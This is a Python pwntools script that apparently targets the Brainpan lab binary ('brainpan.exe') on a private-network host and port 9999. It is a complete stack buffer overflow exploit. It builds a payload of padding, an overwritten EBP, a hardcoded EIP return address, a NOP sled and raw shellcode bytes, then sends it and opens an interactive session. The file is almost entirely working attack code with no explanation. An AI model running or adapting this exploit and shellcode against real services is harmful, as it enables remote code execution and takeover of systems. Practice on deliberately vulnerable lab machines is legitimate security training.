from pwn import *

context.update(arch='i386')
exe = './brainpan.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#====================PAYLOAD DEFINITION=====================
junk    = b'A'*520
EBP     = b'B'*4
EIP     = p32(0x311712f3)
nop     = b'\x90'*8

stack =  b""
stack += b"\xb8\xbe\x8f\x37\x5e\xd9\xcb\xd9\x74\x24\xf4\x5f"
stack += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\xf9"
stack += b"\x81\xd5\xab\x34\x45\xee\xb7\x65\x3a\x42\x52\x8b"
stack += b"\x35\x85\x12\xed\x88\xc6\xc0\xa8\xa2\xf8\x2b\xca"
stack += b"\x8a\x7f\x4d\xa2\xcc\x28\x95\x58\xa5\x2a\xe6\x8d"
stack += b"\x69\xa2\x07\x1d\xf7\xe4\x96\x0e\x4b\x07\x90\x51"
stack += b"\x66\x88\xf0\xf9\x17\xa6\x87\x91\x8f\x97\x48\x03"
stack += b"\x39\x61\x75\x91\xea\xf8\x9b\xa5\x06\x36\xdb"


payload = b''.join([
    junk,
    EBP,
    EIP,
    nop,
    stack,
])
#========================CONNECTION=========================
io = start()

print(io.recv().decode('utf-8'))
#stack_addr = io.recvline()
#print(b'start stack address:' + p64(int(stack_addr, 16)))
#payload += p64(int(stack_addr, 16))
#io.recv() #print(io.recv().decode('utf-8'))
io.sendline(payload)


io.interactive()

#========================INFORMATION========================
# RDI, RSI, RDX, RCX, R8, R9, STACK
#       1    2    3    4   5    6

